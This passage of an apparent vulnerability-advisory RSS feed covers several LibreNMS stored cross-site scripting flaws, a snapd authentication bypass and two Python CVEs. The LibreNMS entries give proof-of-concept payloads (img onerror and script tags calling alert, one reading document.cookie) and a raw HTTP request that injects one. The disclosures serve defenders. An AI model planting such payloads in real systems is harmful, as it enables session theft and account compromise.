of Librenms version 24.10.1 ([https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms](https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms)) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.


The vulnerability in the line:
```php
$attrib_val = get_dev_attrib($device, $name);
```
within the `dynamic_override_config` function arises because the value of `$attrib_val is` retrieved from untrusted data without any sanitization or encoding (at [Line 778](https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms&#x2F;blob&#x2F;master&#x2F;includes&#x2F;html&#x2F;functions.inc.php#L778)). 

When `dynamic_override_config` is called, the unescaped `$attrib_val` is injected directly into the HTML (at [misc.inc.php](https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms&#x2F;blob&#x2F;master&#x2F;includes&#x2F;html&#x2F;pages&#x2F;device&#x2F;edit&#x2F;misc.inc.php)).


**Proof of Concept:**
1. Add a new device through the LibreNMS interface.
2. Edit the newly created device and select the Misc section.
3. In any of the following fields: &quot;Override default ssh port&quot;, &quot;Override default telnet port&quot;, &quot;Override default http port&quot; or &quot;Unix agent port&quot;, enter the payload: `&quot;&amp;gt;&amp;lt;img src onerror=&quot;alert(document.cookie)&quot;&amp;gt;`.
4. Save the changes.
5. Observe that when the page loads, the XSS payload executes, triggering a popup that displays the current cookies.



![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;097d17cb-7a6c-4924-add8-f867df643025)
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;8213d55a-d87a-4a6e-94bf-092877398da5)


**Impact:**

Execution of Malicious Code

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-27vf-3g4f-6jp7: 4.6 | <b>LibreNMS Ports Stored Cross-site Scripting vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-27vf-3g4f-6jp7</link>
                    <pubDate>2025-01-16T17:32:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-27vf-3g4f-6jp7'>https://osv.dev/vulnerability/GHSA-27vf-3g4f-6jp7</a><br>
                            <b>Published:</b> 2025-01-16T17:32:30Z<br>
                            <b>Severity:</b> 4.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/librenms/librenms/security/advisories/GHSA-27vf-3g4f-6jp7'>https://github.com/librenms/librenms/security/advisories/GHSA-27vf-3g4f-6jp7</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms/pull/16721'>https://github.com/librenms/librenms/pull/16721</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms/commit/9d07d166b87634091dcf21c62b28f9b42a3118c4'>https://github.com/librenms/librenms/commit/9d07d166b87634091dcf21c62b28f9b42a3118c4</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms'>https://github.com/librenms/librenms</a></li></ul><br>
                            <b>Details:</b> <b>LibreNMS Ports Stored Cross-site Scripting vulnerability</b><br># StoredXSS-LibreNMS-Ports


**Description:**


Stored XSS on the parameter:
`&#x2F;ajax_form.php` -&amp;gt; param: descr

Request:
```http
POST &#x2F;ajax_form.php HTTP&#x2F;1.1
Host: &amp;lt;your_host&amp;gt;
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: &amp;lt;your_XSRF_token&amp;gt;
Content-Type: application&#x2F;x-www-form-urlencoded; charset=UTF-8
Cookie: &amp;lt;your_cookie&amp;gt;

type=update-ifalias&amp;descr=%22%3E%3Cimg+src+onerror%3D%22alert(1)%22%3E&amp;ifName=lo&amp;port_id=1&amp;device_id=1
```


of Librenms version 24.10.1 ([https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms](https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms)) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.



**Proof of Concept:**
1. Add a new device through the LibreNMS interface.
2. Edit the newly created device and select the &quot;ports&quot; section.
3. In the &quot;Description&quot; field, enter the following payload: `&quot;&amp;gt;&amp;lt;img src onerror=&quot;alert(1)&quot;&amp;gt;`.
4. Save the changes.
5. The XSS vulnerability is triggered when accessing the &quot;ports&quot; tab, and the payload is executed again when hovering over the modified value in the &quot;Port&quot; field.

Payload:
![payload](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;2f38b985-6684-403f-9d1f-e405f09a75bb)

Executes:
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;b70a6e34-d52c-4113-b769-4e271e33de88)
The script execution vulnerability in the description field, as shown in the image, occurs at [Line 63 of functions.inc.php](https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms&#x2F;blob&#x2F;master&#x2F;includes&#x2F;html&#x2F;functions.inc.php#L63)
```php
$overlib_content = &#x27;&amp;lt;div class=overlib&amp;gt;&amp;lt;span class=overlib-text&amp;gt;&#x27; . $text . &#x27;&amp;lt;&#x2F;span&amp;gt;&amp;lt;br &#x2F;&amp;gt;&#x27;;
```

![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;97b85403-5b7e-4f43-932c-d33bd3c0f73f)




**Impact:**

Execution of Malicious Code

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-pm8j-3v64-92cq: 4.6 | <b>LibreNMS Display Name Stored Cross-site Scripting vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-pm8j-3v64-92cq</link>
                    <pubDate>2025-01-16T17:21:20Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-pm8j-3v64-92cq'>https://osv.dev/vulnerability/GHSA-pm8j-3v64-92cq</a><br>
                            <b>Published:</b> 2025-01-16T17:21:20Z<br>
                            <b>Severity:</b> 4.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/librenms/librenms/security/advisories/GHSA-pm8j-3v64-92cq'>https://github.com/librenms/librenms/security/advisories/GHSA-pm8j-3v64-92cq</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms/commit/afe92dbf4321f107012690d476685603d1ccb013'>https://github.com/librenms/librenms/commit/afe92dbf4321f107012690d476685603d1ccb013</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms'>https://github.com/librenms/librenms</a></li></ul><br>
                            <b>Details:</b> <b>LibreNMS Display Name Stored Cross-site Scripting vulnerability</b><br>**Description:**


XSS on the parameters (Replace $DEVICE_ID with your specific $DEVICE_ID value):`&#x2F;device&#x2F;$DEVICE_ID&#x2F;edit` -&amp;gt; param: display


of Librenms versions 24.9.0, 24.10.0, and 24.10.1 ([https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms](https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms)) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.


**Proof of Concept:**
1. Add a new device through the LibreNMS interface.
2. Edit the newly created device by going to the &quot;Device Settings&quot; section.
3. In the &quot;Display Name&quot; field, enter the following payload: `&quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;&#x2F;script&amp;gt;`.
![Screenshot from 2024-11-06 09-41-37](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;6b44e049-5748-4f70-a667-c681cacec9da)

4. Save the changes.
5. The XSS payload triggers when accessing the &quot;&#x2F;apps&quot; path (if an application was previously added).
![Screenshot from 2024-11-06 09-42-05](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;4bd39e1e-6c60-4cc5-b922-8db7fc8094fc)
 
**Additional PoC:**
1. In the &quot;Display Name&quot; field, enter the following payload: `&quot;&amp;gt;&amp;lt;img src onerror=&quot;alert(1)&quot;&amp;gt;`.
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;addb1b00-23b1-4c26-8ac7-494cb24ebe8a)

2. The XSS vulnerability is triggered when accessing the &quot;&#x2F;ports&quot; path, and the payload executes when hovering over the modified value in the &quot;Port&quot; field.
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;446e0d62-2016-4435-a1eb-fe85079498e4)
-  on `&#x2F;device&#x2F;$DEVICE_ID&#x2F;ports&#x2F;arp` path:
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;72a42b6d-bef0-46d4-a210-5d4888dd5c89)

- on `&#x2F;device&#x2F;$DEVICE_ID&#x2F;logs` path:
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;b1322946-7b84-4190-8f77-9854f5b5925c)

- on `&#x2F;search&#x2F;search=arp&#x2F;` path:
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;103297b0-5364-4d12-b519-d74777367a2a)

**Impact:**

Execution of Malicious Code


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-p9v8-q5m4-pf46: 4.0 | <b>CVE-2024-5138: snapd snapctl auth bypass</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-p9v8-q5m4-pf46</link>
                    <pubDate>2025-01-16T17:19:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-p9v8-q5m4-pf46'>https://osv.dev/vulnerability/GHSA-p9v8-q5m4-pf46</a><br>
                            <b>Published:</b> 2025-01-16T17:19:07Z<br>
                            <b>Severity:</b> 4.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/canonical/snapd/security/advisories/GHSA-p9v8-q5m4-pf46'>https://github.com/canonical/snapd/security/advisories/GHSA-p9v8-q5m4-pf46</a></li><li>- <a target='_blank' href='https://github.com/canonical/snapd/commit/68ee9c6aa916ab87dbfd9a26030690f2cabf1e14'>https://github.com/canonical/snapd/commit/68ee9c6aa916ab87dbfd9a26030690f2cabf1e14</a></li><li>- <a target='_blank' href='https://bugs.launchpad.net/snapd/+bug/2065077'>https://bugs.launchpad.net/snapd/+bug/2065077</a></li><li>- <a target='_blank' href='https://github.com/canonical/snapd'>https://github.com/canonical/snapd</a></li><li>- <a target='_blank' href='https://ubuntu.com/security/CVE-2024-5138'>https://ubuntu.com/security/CVE-2024-5138</a></li><li>- <a target='_blank' href='https://www.cve.org/CVERecord?id=CVE-2024-5138'>https://www.cve.org/CVERecord?id=CVE-2024-5138</a></li></ul><br>
                            <b>Details:</b> <b>CVE-2024-5138: snapd snapctl auth bypass</b><br>### Impact

A snap with prior permissions to create a mount entry on the host, such as firefox, normally uses the permission from one of the per-snap hook programs. A unprivileged users cannot normally trigger that behaviour by using `snap run --shell firefox` followed by `snapctl mount`, since snapd validates the requesting user identity (root or non-root). The issue allows unprivileged users to bypass that check by crafting a malicious command line vector which confuses snapd into thinking the help message is requested.

Unprivileged user on a default installation of Ubuntu, where firefox is as provided as a snap, may cause a denial-of-service attack by repeatedly mounting hunspell database over and over and eventually exhausting system memory.

Other attacks, reliant on the same underying mechanism (mount), are possible. In all cases the snap must be installed and grated permission to perform this action (by connecting an appropriate snap interface), which requires administrative privileges. As such we are focusing on the case of default installation where an unprivileged user may exploit this behavior.

### Patches

Patch: https:&#x2F;&#x2F;github.com&#x2F;canonical&#x2F;snapd&#x2F;commit&#x2F;68ee9c6aa916ab87dbfd9a26030690f2cabf1e14
Release: Available from Snapd 2.64

### Workarounds

Users may disconnect any instances of the mount-control interface to prevent snapd from creating such mount points. For example, the firefox snap has the `host-hunspell` plug, which is of type `mount-control`. The interface can be disconnected with:

```sh
sudo snap disconnect firefox:host-hunspell
```

### References

The original bug report was made on Launchpad: https:&#x2F;&#x2F;bugs.launchpad.net&#x2F;snapd&#x2F;+bug&#x2F;2065077
CVE.org: https:&#x2F;&#x2F;www.cve.org&#x2F;CVERecord?id=CVE-2024-5138
Canonical: https:&#x2F;&#x2F;ubuntu.com&#x2F;security&#x2F;CVE-2024-5138
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2f4w-6mc7-4w78: 4.6 | <b>LibreNMS Display Name 2 Stored Cross-site Scripting vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2f4w-6mc7-4w78</link>
                    <pubDate>2025-01-16T17:18:32Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2f4w-6mc7-4w78'>https://osv.dev/vulnerability/GHSA-2f4w-6mc7-4w78</a><br>
                            <b>Published:</b> 2025-01-16T17:18:32Z<br>
                            <b>Severity:</b> 4.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/librenms/librenms/security/advisories/GHSA-2f4w-6mc7-4w78'>https://github.com/librenms/librenms/security/advisories/GHSA-2f4w-6mc7-4w78</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms/pull/16886'>https://github.com/librenms/librenms/pull/16886</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms/commit/c63c912d86098bcefd52a28328482b94632eadf8'>https://github.com/librenms/librenms/commit/c63c912d86098bcefd52a28328482b94632eadf8</a></li><li>- <a target='_blank' href='https://github.com/librenms/librenms'>https://github.com/librenms/librenms</a></li></ul><br>
                            <b>Details:</b> <b>LibreNMS Display Name 2 Stored Cross-site Scripting vulnerability</b><br># StoredXSS-LibreNMS-Display Name 2


**Description:**


XSS on the parameters (Replace $DEVICE_ID with your specific $DEVICE_ID value):`&#x2F;device&#x2F;$DEVICE_ID&#x2F;edit` -&amp;gt; param: display


of Librenms versions 24.11.0 ([https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms](https:&#x2F;&#x2F;github.com&#x2F;librenms&#x2F;librenms)) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.



**Proof of Concept:**
1. Add a new device through the LibreNMS interface.
2. Edit the newly created device by going to the &quot;Device Settings&quot; section.
3. In the &quot;Display Name&quot; field, enter the following payload: `&quot;&amp;gt;&amp;lt;img src onerror=&quot;alert(document.cookie)&quot;&amp;gt;`.
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;b1664e15-eba8-4cdd-b730-fb18936f109c)
4. Save the changes.
5. The XSS payload is triggered when navigating to the path &#x2F;device&#x2F;$DEVICE_ID&#x2F;logs and hovering over a type containing a tag (such as Core 1 in the image).
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;df23cec8-94bb-4155-961b-52ea659654a2)



**Impact:**

Execution of Malicious Code


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2020-10735: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2020-10735</link>
                    <pubDate>2025-01-16T07:24:24.122Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2020-10735'>https://osv.dev/vulnerability/BIT-python-min-2020-10735</a><br>
                            <b>Published:</b> 2025-01-16T07:24:24.122Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2022/09/21/1'>http://www.openwall.com/lists/oss-security/2022/09/21/1</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2022/09/21/4'>http://www.openwall.com/lists/oss-security/2022/09/21/4</a></li><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2020-10735'>https://access.redhat.com/security/cve/CVE-2020-10735</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=1834423'>https://bugzilla.redhat.com/show_bug.cgi?id=1834423</a></li><li>- <a target='_blank' href='https://docs.google.com/document/d/1KjuF_aXlzPUxTK4BMgezGJ2Pn7uevfX7g0_mvgHlL7Y'>https://docs.google.com/document/d/1KjuF_aXlzPUxTK4BMgezGJ2Pn7uevfX7g0_mvgHlL7Y</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/95778'>https://github.com/python/cpython/issues/95778</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/06/msg00039.html'>https://lists.debian.org/debian-lts-announce/2023/06/msg00039.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/2VCU6EVQDIXNCEDJUCTFIER2WVNNDTYZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/2VCU6EVQDIXNCEDJUCTFIER2WVNNDTYZ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/32AAQKABEKFCB5DDV5OONRZK6BS23HPW/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/32AAQKABEKFCB5DDV5OONRZK6BS23HPW/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4EWKR2SPX3JORLWCXFY3KN2U5B5CIUQQ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4EWKR2SPX3JORLWCXFY3KN2U5B5CIUQQ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6XL6E5A3I36TRR73VNBOXNIQP4AMZDFZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6XL6E5A3I36TRR73VNBOXNIQP4AMZDFZ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/76YE7AM37MRU76XJV4M27CWDAMUGNRYK/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/76YE7AM37MRU76XJV4M27CWDAMUGNRYK/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HSRPVJZL6DJFWKYRHMNJB7VCEUCBKRF5/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HSRPVJZL6DJFWKYRHMNJB7VCEUCBKRF5/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IFGV7P2PYFBMK32OKHCAC2ZPJQV5AUDF/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IFGV7P2PYFBMK32OKHCAC2ZPJQV5AUDF/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NHC6IUU7CLRQ3QLPWUXLONSG3SXFTR47/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NHC6IUU7CLRQ3QLPWUXLONSG3SXFTR47/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OKYE2DOI2X7WZXAWTQJZAXYIWM37HDCY/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OKYE2DOI2X7WZXAWTQJZAXYIWM37HDCY/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OT5U223OE5ZOUHZAZYSYSWVJQIKDE73E/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OT5U223OE5ZOUHZAZYSYSWVJQIKDE73E/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OT5WQB7Z3CXOWVBD2AFAHYPA5ONYFFZ4/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OT5WQB7Z3CXOWVBD2AFAHYPA5ONYFFZ4/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PD7FTLJOIGMUSCDR3JAN6WRFHJEE4PH5/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PD7FTLJOIGMUSCDR3JAN6WRFHJEE4PH5/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SZYJSGLSCQOKXXFVJVJQAXLEOJBIWGEL/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SZYJSGLSCQOKXXFVJVJQAXLEOJBIWGEL/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TD7JDDKJXK6D26XAN3YRFNM2LAJHT5UO/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TD7JDDKJXK6D26XAN3YRFNM2LAJHT5UO/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TMWPRAAJS7I6U3U45V7GZVXWNSECI22M/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TMWPRAAJS7I6U3U45V7GZVXWNSECI22M/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/U4ZZV4CDFRMTPDBI7C5L43RFL3XLIGUY/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/U4ZZV4CDFRMTPDBI7C5L43RFL3XLIGUY/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UBPDVCDIUCEBE7C4NAGNA2KQJYOTPBAZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UBPDVCDIUCEBE7C4NAGNA2KQJYOTPBAZ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/V7ZUJDHK7KNG6SLIFXW7MNZ6O2PUJYK6/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/V7ZUJDHK7KNG6SLIFXW7MNZ6O2PUJYK6/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/WXF6MQ74HVIDDSR5AE2UDR24I6D4FEPC/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/WXF6MQ74HVIDDSR5AE2UDR24I6D4FEPC/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZEOAJWGGY55QU35UM2OVZATBW5MX2OZD/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZEOAJWGGY55QU35UM2OVZATBW5MX2OZD/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A flaw was found in python. In algorithms with quadratic time complexity using non-binary bases, when using int(&quot;text&quot;), a system could take 50ms to parse an int string with 100,000 digits and 5s for 1,000,000 digits (float, decimal, int.from_bytes(), and int() for binary bases 2, 4, 8, 16, and 32 are not affected). The highest threat from this vulnerability is to system availability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2021-23336: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2021-23336</link>
                    <pubDate>2025-01-16T07:23:36.998Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2021-23336'>https://osv.dev/vulnerability/BIT-python-min-2021-23336</a><br>
                            <b>Published:</b> 2025-01-16T07:23:36.998Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/02/19/4'>http://www.openwall.com/lists/oss-security/2021/02/19/4</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2021/05/01/2'>http://www.openwall.com/lists/oss-security/2021/05/01/2</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/24297'>https://github.com/python/cpython/pull/24297</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367%40%3Cusers.airflow.apache.org%3E'>https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367%40%3Cusers.airflow.apache.org%3E</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432%40%3Cannounce.apache.org%3E'>https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432%40%3Cannounce.apache.org%3E</a></li><li>- <a target='_blank' href='https://lists.apache.org/thread.html/rf9fa47ab66495c78bb4120b0754dd9531ca2ff0430f6685ac9b07772%40%3Cdev.mina.apache.org%3E'>https://lists.apache.org/thread.html/rf9fa47ab66495c78bb4120b0754dd9531ca2ff0430f6685ac9b07772%40%3Cdev.mina.apache.org%3E</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2021/02/msg00030.html'>https://lists.debian.org/debian-lts-announce/2021/02/msg00030.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2021/04/msg00005.html'>https://lists.debian.org/debian-lts-announce/2021/04/msg00005.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2021/04/msg00015.html'>https://lists.debian.org/debian-lts-announce/2021/04/msg00015.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/09/msg00022.html'>https://lists.debian.org/debian-lts-announce/2023/09/msg00022.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3EPYWWFDV22CJ5AOH5VCE72DOASZZ255/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3EPYWWFDV22CJ5AOH5VCE72DOASZZ255/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3YKKDLXL3UEZ3J426C2XTBS63AHE46SM/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3YKKDLXL3UEZ3J426C2XTBS63AHE46SM/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/46N6A52EGSXHJYCZWVMBJJIH4NWIV2B5/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/46N6A52EGSXHJYCZWVMBJJIH4NWIV2B5/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FONHJIOZOFD7CD35KZL6SVBUTMBPGZGA/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FONHJIOZOFD7CD35KZL6SVBUTMBPGZGA/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HCQTCSP6SCVIYNIRUJC5X7YBVUHPLSC4/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HCQTCSP6SCVIYNIRUJC5X7YBVUHPLSC4/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HZTM7KLHFCE3LWSEVO2NAFLUHMGYMCRY/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HZTM7KLHFCE3LWSEVO2NAFLUHMGYMCRY/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IHQDU7NXA7EWAE4W7VO6MURVJIULEPPR/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IHQDU7NXA7EWAE4W7VO6MURVJIULEPPR/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/KJXCMHLY7H3FIYLE4OKDYUILU2CCRUCZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/KJXCMHLY7H3FIYLE4OKDYUILU2CCRUCZ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/LVNH6Z24IG3E67ZCQGGJ46FZB4XFLQNZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/LVNH6Z24IG3E67ZCQGGJ46FZB4XFLQNZ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MNUN5SOMFL2BBKP6ZAICIIUPQKZDMGYO/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MNUN5SOMFL2BBKP6ZAICIIUPQKZDMGYO/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MP572OLHMS7MZO4KUPSCIMSZIA5IZZ62/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MP572OLHMS7MZO4KUPSCIMSZIA5IZZ62/</a></li><li>- <a target='_blank' 